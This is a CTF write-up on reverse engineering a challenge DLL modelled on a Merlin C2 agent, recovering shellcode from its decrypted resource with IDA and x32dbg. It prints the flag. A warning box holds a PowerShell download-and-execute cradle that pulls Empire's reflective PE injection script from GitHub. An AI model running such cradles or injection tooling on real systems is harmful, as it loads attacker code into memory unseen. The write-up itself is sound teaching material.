# Reflective Hidden Agenda | Blackberry CTF 2025 | Reverse Engineering

This will be the one reverse engineering challenge I encounter during Blackberry CTFwhere I got 3rd Place locally. I want to write about this because this is the first dynamic analysis challenge that I learned from @Shree. Thanks!

```
$ file Helper.dll
Helper.dll: PE32 executable (DLL) (console) Intel 80386 (stripped to external PDB), for MS Windows, 10 sections
```

As always we start with strings to find suspicious. I'll remove the so obvious nothing helpful strings.

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Users\hzqzz\Downloads> strings Helper.dll
</strong>!This program cannot be run in DOS mode.
.text
`.data
.rdata
@.bss
.edata
@.idata
@.tls
.rsrc
@.reloc
libgcc_s_dw2-1.dll
__register_frame_info
__deregister_frame_info
Flag is not here, but somewhere else
Click okay to delete file
Bazinga FLAG!!!
Patience... i am trying to EXTRACT the flag
C:\Windows\System32\notepad.exe
Mingw-w64 runtime failure:
Address %p has no image-section
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.
runtime error %d
GCC: (GNU) 13.1.0
GCC: (GNU) 14.2.0
chall.dll
VoidFunc
CloseHandle
CreateProcessA
DeleteCriticalSection
EnterCriticalSection
FindResourceA
FreeLibrary
GetLastError
GetModuleHandleA
GetProcAddress
InitializeCriticalSection
LeaveCriticalSection
LoadLibraryA
LoadResource
LockResource
SizeofResource
Sleep
TlsGetValue
VirtualProtect
VirtualQuery
__p__environ
__p__wenviron
_set_new_mode
calloc
free
malloc
__p___argc
__p___argv
__p___wargv
_configure_narrow_argv
_configure_wide_argv
_crt_at_quick_exit
_crt_atexit
_execute_onexit_table
_exit
_initialize_narrow_environment
_initialize_onexit_table
_initialize_wide_environment
_initterm
_register_onexit_function
abort
__acrt_iob_func
__stdio_common_vfprintf
__stdio_common_vfwprintf
fwrite
memset
strlen
strncmp
__daylight
__timezone
__tzname
_tzset
MessageBoxA
KERNEL32.dll
api-ms-win-crt-environment-l1-1-0.dll
api-ms-win-crt-heap-l1-1-0.dll
api-ms-win-crt-runtime-l1-1-0.dll
api-ms-win-crt-stdio-l1-1-0.dll
api-ms-win-crt-string-l1-1-0.dll
api-ms-win-crt-time-l1-1-0.dll
USER32.dll
.eh_frame
aHR0cHM6Ly9tZXJsaW4tYzIucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0L2FnZW50L2RsbC5odG1s
</code></pre>

From here we can see the text that maybe our goal to get the flag. and there is base64 encoded text at the end.

```bash
$ echo "aHR0cHM6Ly9tZXJsaW4tYzIucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0L2FnZW50L2RsbC5odG1s" | base64 -d
https://merlin-c2.readthedocs.io/en/latest/agent/dll.html
```

The web shows about the merlin c2 dll, which related to our dll. It even has the same `VoidFunc` and `Run` functions exported to facilitate executing the dll. The web also shows how to run, etc.&#x20;

before running the dll file, we need to know what exported function there is for the dll file. This can easily be done with PeStudio

<figure><img src="../.gitbook/assets/image (17) (1).png" alt="" width="563"><figcaption></figcaption></figure>

According to merlin dll agent documentation, Run function is the "Main function to execute Merlin agent" while VoidFunc function is "Used with PowerSploit’s Invoke-ReflectivePEInjection.ps1".&#x20;

```powershell
PS C:\Users\hzqzz\Downloads> rundll32.exe .\Helper.dll,Run
```

A notepad will open. and a message box will popup.

<figure><img src="../.gitbook/assets/image (18) (1).png" alt="" width="269"><figcaption></figcaption></figure>

When clicking OK the popup will close. The notepad doesnt even save at my current working directory, so I dont really sure about the delete file. maybe if we save the notepad? Who knows. So we'll be taking a look at the pseudocode for both Run and VoidFunc.

```c
int Run()
{
  return MessageBoxA(0, "Click okay to delete file", "Flag is not here, but somewhere else", 0);
}
```

```c
void VoidFunc()
{
  char *v0; // eax
  _DWORD v1[8]; // [esp+2Ch] [ebp-4Ch] BYREF
  char *v2; // [esp+4Ch] [ebp-2Ch]
  size_t v3; // [esp+50h] [ebp-28h]
  void *v4; // [esp+54h] [ebp-24h]
  void *Block; // [esp+58h] [ebp-20h]
  int v6; // [esp+5Ch] [ebp-1Ch]
  size_t Size; // [esp+60h] [ebp-18h]
  LPVOID v8; // [esp+64h] [ebp-14h]
  HGLOBAL hResData; // [esp+68h] [ebp-10h]
  HRSRC hResInfo; // [esp+6Ch] [ebp-Ch]

  MessageBoxA(0, "Patience... i am trying to EXTRACT the flag", "Bazinga FLAG!!!", 0);
  hResInfo = FindResourceA(hModule, (LPCSTR)0x65, (LPCSTR)0xA);
  hResData = LoadResource(hModule, hResInfo);
  v8 = LockResource(hResData);
  Size = SizeofResource(hModule, hResInfo);
  v1[0] = -895753913;
  v1[1] = 1075939289;
  v1[2] = 337223077;
  v1[3] = 1841767532;
  v1[4] = -2090762614;
  v1[5] = 1302241797;
  v1[6] = 1719303951;
  v1[7] = 154158018;
  v6 = 32;
  Block = malloc(Size);
  sub_6EB41648(v8, Size, v1, 32, Block);
  v4 = Block;
  v3 = Size;
  v2 = (char *)Block;
  while ( v3 )
  {
    v0 = v2++;
    *v0 = 0;
    --v3;
  }
  free(Block);
}
```

Now we know that the Run function literally do nothing. Even the notepad. But we do see the target text taht we want whihc is Bazinga FLAG! Maybe we just need to run VoidFunc?

{% hint style="warning" %}
Spoiler Alert, no flag will be displayed. Can read the pseudocode by yourself. There no flag variable. Even with invoking it with PowerSploit’s Invoke-ReflectivePEInjection.ps1. Heres the script: iex(New-Object net.webclient).downloadstring('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module\_source/management/Invoke-ReflectivePEInjection.ps1');
{% endhint %}

But there is the flag here and I can promise it. We can take a look at the Windows API that has been called. Lemme grab the definition from MSDN. If you read it slowly and carefully, you can know what the dll is doing.

* FindResourceA: Determines the location of a resource with the specified type and name in the specified module.
* LoadResources: Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory.
* LockResources: Retrieves a pointer to the specified resource in memory.
* SizeofResource: Retrieves the size, in bytes, of the specified resource.
* malloc: Allocates memory blocks.
* free: Deallocates or frees a memory block.

There is another function that we may want to look at. for summary, sub\_6EB41648: A custom function that performs decryption using the hardcoded&#x20;key.

```c
unsigned int __cdecl sub_6EB41648(int a1, unsigned int a2, int a3, int a4, int a5)
{
  unsigned int result; // eax
  int v6; // [esp+Ch] [ebp-110h] BYREF
  int v7; // [esp+10h] [ebp-10Ch] BYREF
  _BYTE v8[256]; // [esp+17h] [ebp-105h] BYREF
  char v9; // [esp+117h] [ebp-5h]
  unsigned int i; // [esp+118h] [ebp-4h]

  v7 = 0;
  v6 = 0;
  sub_6EB414D0(a3, a4, v8);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a2 )
      break;
    v9 = sub_6EB4158A(v8, &v7, &v6);
    *(_BYTE *)(a5 + i) = v9 ^ *(_BYTE *)(a1 + i);
  }
  return result;
}
```

```c
int __cdecl sub_6EB414D0(int a1, unsigned int a2, int a3)
{
  int result; // eax
  unsigned __int8 v4; // [esp+3h] [ebp-Dh]
  int j; // [esp+4h] [ebp-Ch]
  int v6; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  for ( i = 0; i <= 255; ++i )
  {
    result = i + a3;
    *(_BYTE *)(i + a3) = i;
  }
  v6 = 0;
  for ( j = 0; j <= 255; ++j )
  {
    v6 = (*(unsigned __int8 *)(j + a3) + v6 + *(unsigned __int8 *)(j % a2 + a1)) % 256;
    v4 = *(_BYTE *)(j + a3);
    *(_BYTE *)(j + a3) = *(_BYTE *)(v6 + a3);
    result = v4;
    *(_BYTE *)(a3 + v6) = v4;
  }
  return result;
}
```

```c
int __cdecl sub_6EB4158A(int a1, int *a2, int *a3)
{
  char v4; // [esp+Fh] [ebp-1h]

  *a2 = (*a2 + 1) % 256;
  *a3 = (*(unsigned __int8 *)(*a2 + a1) + *a3) % 256;
  v4 = *(_BYTE *)(*a2 + a1);
  *(_BYTE *)(a1 + *a2) = *(_BYTE *)(*a3 + a1);
  *(_BYTE *)(a1 + *a3) = v4;
  return *(unsigned __int8 *)((unsigned __int8)(*(_BYTE *)(*a2 + a1) + *(_BYTE *)(*a3 + a1)) + a1);
}
```

Because the resources or the flag is cleaned up using free, we need to do dynamic analysis to retrive the flag. This part I'll use x32dbg. Need to change the preference first.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="331"><figcaption></figcaption></figure>

We know that dll cannot run by itself, need rundll32. So we need to change the command line

`"C:\Windows\SysWOW64\rundll32.exe" C:\Users\hzqzz\Downloads\Helper.dll,VoidFunc`

Make sure to load rundll32.exe not Helper.dll. When we clicked run, we will first break at rundll32's address entry point. Click run again and we will break at VoidFunc.

If you do not have the breakpoint set but x32dbg, you can go to symbols tab and look for VoidFunc after you clicked ito Helper.dll.

Based on VoidFunc decompiled code, the "value" is what we want to read, but there is the while loop and free() that remove the "value" in the memory so we will not get it if we run without breakpoints. So we want to set a breakpoint before the while loop to retrive the "value".

In IDA, we can synchronize Pseudocode with IDA View to pinpoint where is the while loop in the assembly.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

can set a breakpoint around there

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When "follow in dump" at registers, we can read some of the plaintext. so we can assuem that this is a shellcode.

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt="" width="526"><figcaption></figcaption></figure>

&#x20;Can right click >  binary > save to a file. Then use scdbg and click launch.

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

got the flag: bbctf{Ag3ndA\_3xp0s3d}

But heres come the main part that I want to try. Instead of using x32dbg, I want to try using IDA PRO.

First we disassemble Helper.dll. Then set the debugger.

Then there will be a popup of debug application setup. assign rundll32.exe

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

We hit the same breakpoint. But I cant find the right click follow in dump. So I just press G in the hex view and enter address value of the EAX. Which happen got the same result! Time to choose between IDA PRO and x32dbg/x64dbg

<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
